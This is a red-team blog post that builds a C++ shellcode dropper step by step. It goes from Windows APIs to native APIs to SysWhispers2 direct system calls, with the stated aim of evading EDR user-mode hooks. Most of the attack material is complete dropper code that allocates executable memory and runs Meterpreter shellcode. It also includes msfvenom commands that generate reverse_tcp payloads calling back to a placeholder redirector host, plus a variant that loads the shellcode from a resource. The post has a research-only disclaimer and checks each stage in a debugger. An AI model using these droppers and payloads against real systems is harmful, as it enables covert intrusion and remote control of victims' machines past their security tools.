# https://redops.at/en/blog/direct-syscalls-a-journey-from-high-to-low

[Previous](https://redops.at/en/knowledge-base)

# Direct Syscalls: A journey from high to low

**tl;dr** A system call is a technical instruction in the Windows operating system that allows a temporary transition from user mode to kernel mode. This is necessary, for example, when a user-mode application such as Notepad wants to save a document. Each system call has a specific syscall ID, which can vary from one version of Windows to another. Direct system calls are a technique for attackers (red team) to execute code in the context of Windows APIs via system calls without the targeted application (malware) obtaining Windows APIs from Kernel32.dll or native APIs from Ntdll.dll. The assembly instructions required to switch from user mode to kernel mode are built directly into the malware.

In recent years, more and more vendors have implemented the technique of user-mode hooking, which, simply put, allows an EDR to redirect code executed in the context of Windows APIs to its own hooking.dll for analysis. If the code executed does not appear to be malicious to the EDR, the affected system call will be executed correctly, otherwise the EDR will prevent execution. Usermode hooking makes malware execution more difficult, so attackers (red teams) use various techniques such as API unhooking, direct system calls or indirect system calls to bypass EDRs.

In this article, I will focus on the **Direct System Call** technique and show you how to create a Direct System Call shellcode dropper step-by-step using Visual Studio in C++. I will start with a dropper that only uses the Windows APIs (High Level APIs). In the second step, the dropper undergoes its first development and the Windows APIs are replaced by Native APIs (Medium Level APIs). And in the last step, the Native APIs are replaced by Direct System Calls (Low Level APIs).

- [EDR Evasion](https://redops.at/en/knowledge-base?filter=EDR%20Evasion)
- [Malware Development](https://redops.at/en/knowledge-base?filter=Malware%20Development)

### Disclaimer

The content and all code examples in this article are for research purposes only and must not be used in an unethical context! The code used is not new and I make no claim to it. Most of the code comes, as so often, from [**ired.team**](https://www.ired.team/), thank you [**@spotheplanet**](https://twitter.com/spotheplanet) for your brilliant work and sharing it with us all!

### Introduction

The technique of direct system calls is no longer a new attack technique for Red Teamers today (April 2023). I myself have covered this topic several times ( [DeepSec Vienna 2020](https://blog.deepsec.net/deepsec-2020-talk-epp-edr-unhooking-their-protections-daniel-feichter/)) and there are already a large number of well-written articles and useful code repositories on the Internet. Nevertheless, I would like to revisit the topic and look at various aspects related to direct system calls.

For the next articles in my blog, it is important to me personally to take a closer look at the topic of direct system calls. In this article I will show how to create a shellcode dropper in C++ in Visual Studio (VS) that does not use Windows APIs and Native APIs, but instead uses direct system calls. I will explain what exactly a direct system call is a little later in this article. As a starting point, a simple high level API dropper is used, which is then developed step by step into a direct system call dropper based on low level APIs. The steps to develop the direct system call dropper are as follows:

- **Step 1:** High Level APIs -> Shellcode execution via Windows APIs

- **Step 2:** Medium Level APIs -> Shellcode execution via native APIs

- **Step 3:** Low Level APIs -> Shellcode execution via direct system calls

- **Bonus:** Shellcode as .bin ressource

I will also explain how to analyse and check your droppers using tools such as API Monitor, Dumpbin and x64dbg. For example, I will look at how to make sure that the dropper is importing the correct Windows APIs or not, and whether the system calls are being executed correctly or from the correct or expected region in the PE structure.

### What is a System Call?

Before I go into what a direct system call is and how it is used by attackers (Red Team), it is important to clarify what a system call is in the first place. Technically, at assembly level, a system call is an instruction implemented into a syscall stub that enables the temporary transition (transition CPU switch) from user mode to kernel mode after the execution of code in Windows user mode in the context of the respective Windows API. The system call thus forms the interface between a process in user mode and the task to be executed in the Windows kernel.

Why do you need system calls at all in an operating system that is split into user mode and kernel mode? Here are some examples:

- Access to hardware such as scanners and printers

- Network connections for sending and receiving data packets

- Reading and writing files


The following example is intended to illustrate how system calls work under Windows OS. The user wants to save some text or code written in Notepad to the hard disk of the device. To do this, the user mode process notepad.exe needs temporary access to the file system and to various device drivers. However, as both of these components reside in the Windows kernel, user mode access is not straightforward. To solve this problem, Windows uses system calls. These are programmatic instructions that allow a temporary transition from user mode to kernel mode for a specific task of an application, e.g. notepad.exe. Each system call can be found by its own syscall ID and is associated with a specific native API in Windows. However, the syscall ID can vary from one version of Windows to another.

Please note that this is a very simplified representation of how system calls work in Windows. In detail, user mode and kernel mode operations are much more complex. However, this explanation should be sufficient to illustrate the basic principle. If you want to know more about system calls, I recommend that you take a look at the Windows Internals.

![Notepad transition syscall](https://redops.at/assets/images/blog/notepad_transition_syscall.png)

The figure above shows the technical principle of system calls using the above example with notepad. To perform the save operation in the context of the user-mode process notepad.exe, in the first step it accesses kernel32.dll and calls the Windows API WriteFile. In the second step, kernel32.dll accesses Kernelbase.dll in the context of the same Windows API. In the third step, the Windows API WriteFile accesses the Native API NtCreateFile through Ntdll.dll. The Native API contains the technical instructions or syscall call stub to initiate the system call by executing the system call ID and enables the temporary transition (CPU switch) from user mode (ring 3) to kernel mode (ring 0) after execution.

It then calls the system service dispatcher aka KiSystemCall/KiSystemCall64 in the Windows kernel, which is responsible for querying the system service descriptor table (SSDT) for the appropriate function code based on the executed system call ID (index number in the EAX register). Once the system service dispatcher and the SSDT have worked together to identify the function code for the system call in question, the task is executed in the Windows kernel. Thanks to [**@re\_and\_more**](https://twitter.com/re_and_more/status/1510512453800636421?lang=en) for the useful explanation of the system service dispatcher.

In simple terms, system calls are needed in Windows to perform the temporary transition (CPU switch) from user mode to kernel mode, or to execute tasks initiated in user mode that require temporary access to kernel mode - such as saving files - as a task in kernel mode.

### What is a Direct System Call?

TThis is a technique that allows an attacker (red team) to execute malicious code, such as shell code, in the context of APIs on Windows in such a way that the system call is not obtained via `ntdll.dll`. Instead, the system call or system call stub is implemented in the malware itself, e.g. in the .text region in the form of assembly instructions. Hence the name direct system calls.

There are several ways to implement direct system calls in malware. In the rest of this article, I will show how to use the syswhispers2 tool to generate the required native API functions and assembler instructions, and implement them in the C++ project under Visual Studio as Microsoft Macro Assembler (masm) code.

Compared to the previous illustration in the system calls chapter, the following illustration shows the principle of direct system calls under Windows in a simplified way. It can be seen that the user-mode process Malware.exe does not get the system call for the native API NtCreateFile via `ntdll.dll`, as would normally be the case, but instead has implemented the necessary instructions for the system call in itself.

![Direct syscall principle](https://redops.at/assets/images/blog/direct_syscall_principle.png)

### Why Direct System Calls?

Both anti-virus (AV) and endpoint detection and response (EDR) products rely on different defence mechanisms to protect against malware. To dynamically inspect potentially malicious code in the context of Windows APIs, most EDRs today implement the principle of user-mode API hooking. Put simply, this is a technique whereby code executed in the context of a Windows API, such as `VirtualAlloc` or its native API `NtAllocateVirtualMemory`, is deliberately redirected by the EDR into the EDR's own `hooking.dll`. Under Windows, the following types of hooking can be distinguished, among others:

- Inline API hooking

- Import Address Table (IAT) hooking

- SSDT hooking (Windows Kernel)

Before the introduction of Kernel Patch Protection (KPP) aka Patch Guard, it was possible for antivirus products to implement their hooks in the Windows kernel, e.g. using SSDT hooking. With Patch Guard, this was prevented by Microsoft for reasons of operating system stability. Most of the EDRs I have analysed rely primarily on inline API hooking. Technically, an inline hook is a 5-byte assembly instruction (also called a jump or trampoline) that causes a redirection to the EDR's `hooking.dll` before the system call is executed in the context of the respective native API. The redirection from the` hooking.dll` back to the system call in the `ntdll.dll` only occurs if the executed code analysed by the Hooking.dll was found to be harmless. Otherwise, the execution of the corresponding system call is prevented by the Endpoint Protection (EPP) component of an EPP/EDR combination. The following figure shows a simplified illustration of how user-mode API hooking works with EDR.

![Usermode hooking principle](https://redops.at/assets/images/blog/Usermode_hooking_principle.png)

If you take a closer look at the technical structure of the Windows 10 architecture, you will notice that the `ntdll.dll` in user mode represents the lowest common denominator before the transition to the Windows kernel. For this reason, some well-known EDRs place their inline hooks in specially selected native APIs in ntdll.dll. Ok, if it's that simple, then an EDR could just hook into all the native APIs and make life hell for us Red Teamers. Fortunately, from a Red Teamer's point of view, this is not possible for performance reasons. Simply put, hooking APIs costs resources, time, etc., and the more an EDR slows down an OS, the worse it is for the EDR.

As a result, EDRs typically only hook select APIs that are often abused by attackers in conjunction with malware. These include native APIs such as NtAllocateVirtualMemory and NtWriteVirtualMemory.

[![https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components](https://redops.at/assets/images/blog/windows_nt_architecture.png)](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components) https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/overview-of-windows-components

If you want to check your own EDR to see if it or which APIs are redirected to the EDR's own `hooking.dll` by inline hooking, you can use a debugger such as WinDbg. To do this, start a program on the endpoint with EDR installed, e.g. notepad, and then connect to the running process via WinDbg. Note that if you make the same mistake as I did at the beginning and load notepad.exe directly as an image into the debugger, you will not find any hooks in the APIs, because in this case the EDR has not yet been able to inject its Hooking.dll into the address space of notepad.exe.

The following command extracts the memory address of the desired API, in this case the address of the native API `NtAllocateVirtualMemory`, which is located in `ntdll.dll`.

Code kopieren


```c
x ntdll!NtAllocateVirtualMemory
```

The memory address can then be resolved in the next step with the following command and you will get the contents of the native API `NtAllocateVirtualMemory` in assembly format.

Code kopieren


```html
u 00007ff8`16c4d3b0
```

The following figure shows a comparison between an endpoint with no EDR installed and no hook, and an endpoint with EDR installed that uses user mode inline hooking for native APIs in `ntdll.dll`. On the endpoint with EDR installed, the `5-byte` jump instruction (`jmp`) is clearly visible. As mentioned earlier, this instruction causes a redirection to the EDR's `hooking.dll` before returning to ntdll.dll and executing the system call.

![](https://redops.at/assets/images/blog/windgb_comparison.png)

If you want to be sure that the jump instruction really causes a redirect to the EDR's `hooking.dll`, you can check this with e.g. x64dbg. If you follow the address of the jump instruction of a hooked API, e.g. `NtAllocateVirtualMemory` in memory (follow in dissasembler), you will see the redirect to the EDR's `hooking.dll`. The name of the `hooking.dll` is intentionally pixelated so that the EDR cannot be identified.

![X64dbg hook principle](https://redops.at/assets/images/blog/x64dbg_hook_principle.png)

### Consequences for the Red Team

From red team's perspective, the usermode hooking technique results in EDR making it difficult or impossible for malware, such as shellcode, to execute. For this reason, red teamer as well as malicious attackers use various techniques to bypass EDR usermode hooks. Among others, the following techniques are used individually, but also in combination, e.g. API unhooking and direct system calls..

- API-unhooking

- Direct system calls

- Indirect system calls

In this article I will only focus on the direct system call technique, i.e. I will implement direct system calls in the dropper later on, thus trying to avoid getting the corresponding system calls from `ntdll.dll`, where some EDRs place their usermode hooks. The basics of direct system calls and usermode hookings should now be clear and the development of the direct system call dropper can begin.

### Step 1: High Level APIs

In the first step, I deliberately do not use direct system calls yet, but start with the classic implementation via Windows APIs, which are obtained via the `kernel32.dll`. The POC can be created as a new C++ project (Console Application) in VS and the code can be taken over.

The technical functionality of the high level API is relatively simple and therefore, in my opinion, perfectly suited to gradually develop the high level API dropper into a direct system call dropper. The code works as follows.

Within the main function, the variable `code` is defined, which is responsible for storing the shellcode. The content of `code` is stored in the .text (code) section of the PE structure or, if the shellcode is larger than 255 bytes, the shellcode is stored in the .rdata section.

Code kopieren


```cpp
// Insert Meterpreter shellcode
	unsigned char code[] = "\xa6\x12\xd9...";
```

The next step is to define the function pointer `void*`, which points to the variable `exec` and stores the return address of the allocated memory using the Windows API **[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)**.

Code kopieren


```cpp
// Allocate Virtual Memory
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```

The **[memcpy](https://learn.microsoft.com/de-de/cpp/c-runtime-library/reference/memcpy-wmemcpy?view=msvc-170)** function copies the shellcode in the `code` variable into the allocated memory.

Code kopieren


```cpp
// Copy MSF-Shellcode into the allocated memory
	memcpy(exec, code, sizeof code);
```

And in the last step, the shellcode is executed by calling the function pointer `((void(*)())exec)()`.

Code kopieren


```cpp
// Execute MSF-Shellcode in memory
	((void(*)())exec)();
	return 0;
```

You can then generate, for example, meterpreter shellcode and copy it into the finished **high-level API dropper**.

Code kopieren


```cpp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=External_IPv4_Redirector LPORT=80 -f c
```

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>

int main() {

	// Insert Meterpreter shellcode
	unsigned char code[] = "\xa6\x12\xd9...";

	// Allocate Virtual Memory
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy shellcode into allocated memory
	memcpy(exec, code, sizeof code);

	// Execute shellcode in memory
	((void(*)())exec)();
	return 0;

}
```

As mentioned at the beginning, in this article I will show you step by step how to develop your own direct system call dropper in C++. I will also perform a simple API analysis in the context of the different droppers (high, medium and low) and compare the results. For each dropper I want to check from which region of the PE structure the used system calls are called, check if the result seems plausible and compare the results again. The following tools will be used.

- [API-Monitor](http://www.rohitab.com/apimonitor) -\> API analysis

- [VS Dumpbin](https://learn.microsoft.com/de-de/cpp/build/reference/dumpbin-reference?view=msvc-170) -\> API analysis
- [x64dbg](https://x64dbg.com/) -\> API and system call analysis

#### API-Monitor: High Level APIs

I use the program API Monitor to check which APIs or if the correct APIs are being used in the high level POC. In this case I verify that the Windows API `VirtualAlloc` has been imported by `kernel32.dll`. I also want to see if there is a correct transition from `VirtualAlloc` to `NtAllocateVirutalMemory`. For a correct check it is necessary to filter on the correct APIs. In the context of the high level API dropper, I filter on the following API calls:

- VirtualAlloc
- NtAllocateVirtualMemory

- RtlCopyMemory

- CreateThread
- NtCreateThreadEx

The screenshot of the API Monitor result shows that, as expected, the Windows API `VirtualAlloc` is called from `kernel32.dll` in the first step, and then the corresponding native API `NtAllocateVirtualMemory` is called from `ntdll.dll` via `VirtualAlloc`. You can also see that the native API `NtCreateThreadEx` was called correctly afterwards. The result in the API Monitor is OK as far as it goes.

![High level api monitor](https://redops.at/assets/images/blog/high_level_api_monitor.png)

#### Dumpbin: High Level APIs

The Visual Studio tool "dumpbin" can be used to check which Windows APIs are imported via `kernel32.dll`. The following command can be used to verify the imports.

Code kopieren


```cpp
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```

The following figure shows that the Windows API VirtualAlloc has been imported correctly.

![Dumpbin high level](https://redops.at/assets/images/blog/dumpbin_high_level.png)

#### x64dbg: High Level APIs

Using x64dbg I check from which region of the PE structure of the high level API dropper the system call for the native API `NtAllocateVirtualMemory` is executed. As direct system calls are not yet used in this dropper, the figure shows that the system call is correctly executed from the .text region of `ntdll.dll`. This investigation is very important because later in the article I expect a different result with the low level POC and want to match it.

![Systemcall x64dbg highlevel](https://redops.at/assets/images/blog/systemcall_x64dbg_highlevel.png)

![High level poc illustration](https://redops.at/assets/images/blog/high_level_poc_illustration.png)

### Step 2: Medium Level APIs

In this step I will make the first extension to the dropper and replace the Windows APIs (kernel32.dll) with native APIs (ntdll.dll) in the high level API dropper. In this case, the change is relatively simple as only the Windows API VirtualAlloc needs to be replaced with the native API **[NtAllocateVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory)**. In addition, the native APIs **[RtlCopyMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)** and **[NtFreeVirtualMemory](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntfreevirtualmemory)** are added to the code.

Unlike the Windows APIs, most of the Native APIs are not officially or partially documented by Microsoft and are therefore not intended for Windows OS developers. In order to use the native APIs in the medium level dropper, we must manually define the function pointers for the native API functions.

Code kopieren


```cpp
// Define the NtAllocateVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
```

If you look at the code of the medium level dropper, you will see that the import of the actual function of the native APIs used is still done via the `ntdll.dll`.

Code kopieren


```cpp
// Load the NtAllocateVirtualMemory function from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
        (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
```

For example, if an EDR would only sets its user mode hooks in kernel32.dll, the medium level API dropper should be sufficient to bypass the EDR's hooks. The finished C++ code for the medium level dropper looks like this.

Code kopieren


```cpp
#include <stdio.h>
#include <windows.h>
#include <winternl.h>

// Define the NtAllocateVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

// Define the NtFreeVirtualMemory function pointer
typedef NTSTATUS(WINAPI* PNTFREEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

int main() {

    // Insert Meterpreter shellcode
    unsigned char code[] = "\xa6\x12\xd9...";

    // Load the NtAllocateVirtualMemory function from ntdll.dll
    PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory =
        (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

    // Allocate Virtual Memory
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    RtlCopyMemory(exec, code, sizeof code);

    // Execute shellcode in memory
    ((void(*)())exec)();

    // Free the allocated memory using NtFreeVirtualMemory
    PNTFREEVIRTUALMEMORY NtFreeVirtualMemory =
        (PNTFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtFreeVirtualMemory");
    SIZE_T regionSize = 0;
    status = NtFreeVirtualMemory(GetCurrentProcess(), &exec, &regionSize, MEM_RELEASE);

    return 0;
}
```

#### API-Monitor: Medium Level APIs

In this case, API Monitor should also be used to check which APIs are used by the medium level dropper. In this case, API Monitor will filter for the following API calls:

- VirtualAlloc
- NtAllocateVirtualMemory

- RtlCopyMemory

- CreateThread
- NtCreateThreadEx

- NtFreeVirtualMemory

The following figure shows that the medium level dropper correctly no longer imports or uses Windows APIs. In other words, Windows APIs are no longer obtained via `kernel32.dll`.

![Api monitor medium level poc](https://redops.at/assets/images/blog/api-monitor_medium_level_poc.png)

#### Dumpbin: Medium Level APIs

In this case, I would also like to check the imported Windows APIs with dumpbin. Since in this case the medium level POC is only getting native APIs from `ntdll.dll`, the figure shows that in the context of the APIs we are using, no Windows APIs are being imported from `kernel32.dll`. This result is expected and plausible.

![Dumpbin medium level](https://redops.at/assets/images/blog/dumpbin_medium_level.png)

#### x64dbg: Medium Level APIs

Since no direct system calls are used in the medium level POC, you can see with x64dbg that the system call for `NtAllocateVirtualMemory` correctly comes from the .text region of `ntdll.dll`.

![Systemcall x64dbg medium level](https://redops.at/assets/images/blog/systemcall_x64dbg_medium_level.png)

![Medium level poc illustration](https://redops.at/assets/images/blog/medium_level_poc_illustration.png)

### Step 3: Low Level APIs

The third step is the further development of the medium level dropper into a low level dropper, i.e. I am now creating the actual direct system call dropper. **Thanks** to my buddy **Jonas** for helping me finish the low level dropper.

As mentioned before, system calls are usually made using the native APIs in ntdll.dll. This means that in order to be able to use the functions of the native APIs used and the associated syscalls without accessing the ntdll.dll, they have to be implemented directly in the code of the low level dropper. In this case, the required code is implemented in the .text region of the low level dropper.

Fortunately, there are ingenious tools called **SysWhispers2** by **@Jackson\_T** that can automatically generate the required code.

- syscalls.h

- syscalls.c

- syscallsstubs.std.x64.asm

The following command can be used to create the necessary files with **SysWhispers2**. In this case, I want to avoid unneeded code ending up in the low level API dropper, so I specify exactly the Native APIs I need with the -f parameter. In this case, the following native APIs and corresponding system calls are required in the form of assembly code:

- NtAllocateVirtualMemory
- NtWriteVirtualMemory
- NtCreateThreadEx
- NtWaitForSingleObject
- NtClose

Code kopieren


```python
python syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -a x64 -l masm --out-file syscalls
```

![Syswhispers2 output](https://redops.at/assets/images/blog/syswhispers2_output.png)

The `syscalls.h` file can then be added to the VS project as a header, the `syscallsstubs.std.x64.asm` (for x64) file as a resource and the `syscalls.c` file as a source. To use the assembly code from the .asm file in VS, the Microsoft Macro Assembler (.masm) option must be enabled in Build Dependencies/Build Customisations. See the SysWhispers2 [**documentation**](https://github.com/jthuraisamy/SysWhispers2#:~:text=Importing%20into%20Visual%20Studio) for more details.

![Masm](https://redops.at/assets/images/blog/masm.png)

In addition, the properties of the file `syscallsstubs.std.x64.asm` must be specified as follows.

![Low level properties asm code](https://redops.at/assets/images/blog/low_level_properties_asm_code.png)

![Low level vs](https://redops.at/assets/images/blog/low_level_vs.png)

In this case, the dropper also needs the code of the native APIs used and the corresponding system calls, but the big difference compared to the medium level dropper is that the code is no longer done via `ntdll.dll` (hooked by the EDR), but is integrated directly into the dropper. If you compare the final code of the low level dropper with the code of the medium level dropper, you will notice that the function pointers to the native APIs used are no longer in main, but in the header file `syscalls.h`. The code required for the functions and system calls is in the file `syscallsstubs.std.x64.asm`.

Code kopieren


```cpp
#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xa6\x12\xd9...";

    LPVOID allocation_start;
    SIZE_T allocation_size = sizeof(code);
    HANDLE hThread;
    NTSTATUS status;

    allocation_start = nullptr;

    // Allocate Virtual Memory
    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, (PULONG64)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0);

    // Execute shellcode in memory
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), allocation_start, allocation_start, FALSE, NULL, NULL, NULL, NULL);

    // Wait for the end of the thread and close the handle
    NtWaitForSingleObject(hThread, FALSE, NULL);
    NtClose(hThread);

    return 0;
}
```

If everything has been done correctly, the direct system call dropper is ready and can be compiled.

#### API-Monitor: Low Level APIs

Even after the last change, I want to use API Monitor to check which APIs are used by the low-level dropper. In this case, API Monitor will filter for the following API calls:

- VirtualAlloc
- NtAllocateVirtualMemory

- RtlCopyMemory

- CreateThread
- NtCreateThreadEx

- NtFreeVirtualMemory

In the following picture you can see that the import of the Native APIs is also done via the `ntdll.dll`. This result is not entirely clear to me at the moment, because with the low level dropper I do not get the native APIs via the `ntdll.dll`, but have implemented them directly in the .text region of the dropper, one should not actually see any imported native APIs. The result with API Monitor does not seem plausible to me in this case.

![Low level api monitor](https://redops.at/assets/images/blog/low_level_api_monitor.png)

#### Dumpbin: Low Level APIs

Using dumpbin, I check again which Windows APIs are being imported via `kernel32.dll`. Again, no Windows APIs are imported from the native APIs in the context. The result is OK so far.

![Dumpbin low level](https://redops.at/assets/images/blog/dumpbin_low_level.png)

#### x64dbg: Low Level APIs

As already known, I did not call the native APIs and the corresponding system calls in the low level dropper via `ntdll.dll`, but implemented them directly in the dropper. This can be checked with x64dbg by looking at the implemented functions in low\_level.exe. The following figure shows that the native API `NtAllocateVirtualMemory` has been implemented correctly.

The figure also shows that the `syscall` instruction to `NtAllocateVirtualMemory` is correctly implemented in the low level dropper. To do this, I follow the native API `NtAllocateVirtualMemory` in the dissassembler (Follow in Dissassembler) and then use "Follow in Memory Map" to show where the `syscall` statement is called from. As expected, the call is made from the **.text section** of the **PE structure** of **low\_level.exe**.

![Systemcall x64dbg low level](https://redops.at/assets/images/blog/systemcall_x64dbg_low_level.png)

![Low level poc illustration](https://redops.at/assets/images/blog/low_level_poc_illustration.png)

### Bonus section: Shellcode as .bin resource

As an additional task, I want to implement that the meterpreter shellcode in the direct system call dropper is not stored as an unsigned char, but as a resource in the form of a .bin file. This has the advantage that the dropper can also be equipped with stageless shellcode. The idea and code snippet for this is not mine, but, as so often, from an article by the **[ired.team](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)**. I just integrated the code snippet into the syscall dropper.

First I create a stageless meterpreter payload with msfvenom as follows.

Code kopieren


```cpp
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IPv4_redirector LPORT=80 -f raw > /tmp/code.bin
```

Afterwards, the shellcode can be imported into the VS project in .bin format as a resource.

![](https://redops.at/assets/images/blog/bin_as_ressource.png)

Code kopieren


```cpp
#include <iostream>
#include <Windows.h>
#include "syscalls.h"
#include "resource.h"

int main() {
    // Insert shellcode
    HRSRC codeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_CODE_BIN1), L"CODE_BIN");
    DWORD codeSize = SizeofResource(NULL, codeResource);
    HGLOBAL codeResourceData = LoadResource(NULL, codeResource);
    LPVOID codeData = LockResource(codeResourceData);

    LPVOID allocation_start = nullptr;
    SIZE_T allocation_size = codeSize;
    HANDLE hThread = nullptr;

    // Allocate Virtual Memory
    NtAllocateVirtualMemory(GetCurrentProcess(), &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, codeData, codeSize, NULL);

    // Execute shellcode in memory
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);

    // Wait for the end of the thread and close the handle
    NtWaitForSingleObject(hThread, FALSE, NULL);
    NtClose(hThread);

    return 0;
}
```

### Summary

The following article explained what a system call basically is, how it works and what it is used for in the Windows operating system. It was also explained that direct system calls are a technique for attackers to bypass the API hooking mechanism used by EDRs. The development of a direct system call dropper was then started. As a base, a high level API dropper was created using the Windows API `VirtualAlloc`. Next, the Windows APIs were replaced by native APIs for further development into a medium level API dropper. Finally, the actual syscalls dropper was created by replacing all native APIs with direct system calls or by implementing the native APIs and the assembly instructions for the direct system calls directly in the dropper itself.

In addition, each dropper was checked for plausibility using various tools. For example, in the case of the high level API dropper, the transition from the Windows API `VirtualAlloc` to the native API `NtAllocateVirtualMemory` was easily observed. Similarly, with the medium level API dropper, API Monitor could observe that no native APIs were being used correctly. Something similar can be done with the Visual Studio tool dumpbin by checking which Windows APIs are loaded from `kernel32.dll` into the import address table of the corresponding .exe. For example, the Windows API `VirtualAlloc` was correctly imported for the high level dropper, but not for the medium and low level droppers.

Analysis of the droppers with x64dbg was also very revealing. For example, it could be seen that the system calls for the native APIs used were correctly loaded or executed from the .text section of `ntdll.dll` for the high and medium level droppers. In comparison, for the direct system call dropper (low level APIs), the required system calls for the native APIs used were correctly loaded from the .text section of the dropper itself.

Personally, I still find the topic of Windows internals, shellcode, malware, EDRs, etc. extremely exciting, my passion for these topics continues unabated, and I look forward to delving deeper into the next topic.

All **code examples** in this article can also be found on my **[Github account](https://github.com/VirtualAlllocEx/Direct-Syscalls-A-journey-from-high-to-low)**.

Happy Hacking!

Daniel Feichter [@VirtualAllocEx](https://twitter.com/VirtualAllocEx)

### References

- [https://www.guru99.com/system-...](https://www.guru99.com/system-call-operating-system.html)
- [https://alice.climent-pommeret...](https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/#:~:text=This%20number%20is%20called%20syscall,OS%20versions%20or%20service%20packs).
- [https://klezvirus.github.io/Re...](https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/)
- [https://outflank.nl/blog/2019/...](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- [https://twitter.com/re\_and\_mor...](https://twitter.com/re_and_more/status/1510512453800636421?lang=en)
- [https://www.malwaretech.com/20...](https://www.malwaretech.com/2015/01/inline-hooking-for-programmers-part-1.html)
- [https://www.ired.team/offensiv...](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)
- [https://www.ired.team/offensiv...](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
- [https://outflank.nl/blog/2019/...](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- [https://github.com/jthuraisamy...](https://github.com/jthuraisamy/SysWhispers2)

Last updated

31.03.24 14:32:06

31.03.24


Daniel Feichter


Posts about related Topics


- [Workshop\\
\\
\\
2026-01-23\\
\\
\\
Demo Material – Endpoint Security Insights Workshop\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/demo-material-endpoint-security-insights-workshop)
- [Workshop\\
\\
\\
2026-01-02\\
\\
\\
Training/Workshop - Endpoint Security Insights: Shellcode Loaders & Evasion Fundamentals\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/training-endpoint-security-insights-shellcode-loaders-and-evasion-fundamentals)
- [Windows Internals\\
\\
\\
2025-10-15\\
\\
\\
The Emulator's Gambit: Executing Code from Non-Executable Memory\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/the-emulators-gambit-executing-code-from-non-executable-memory)
- [Workshop\\
\\
\\
2025-09-10\\
\\
\\
Endpoint Security Insights Workshop: Option B - Self-Paced\\
\\
\\
Daniel Feichter](https://redops.at/en/blog/endpoint-security-insights-workshop-option-b-self-paced)

Back to top